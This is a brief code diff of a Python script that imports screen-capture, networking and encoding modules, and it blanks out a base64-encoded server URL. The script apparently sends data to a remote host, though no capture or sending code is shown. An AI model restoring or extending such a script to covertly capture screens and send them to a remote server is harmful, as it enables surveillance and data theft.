@@ -1,7 +1,7 @@
 
 import base64, requests, os, sys, shutil, io, mss, random, json, mss.tools, time, threading
 
-SERVER = "aHR0cHM6Ly9icm10ZXN0Mi52ZXJjZWwuYXBwLw=="
+SERVER = ""
 
 class Main:
 
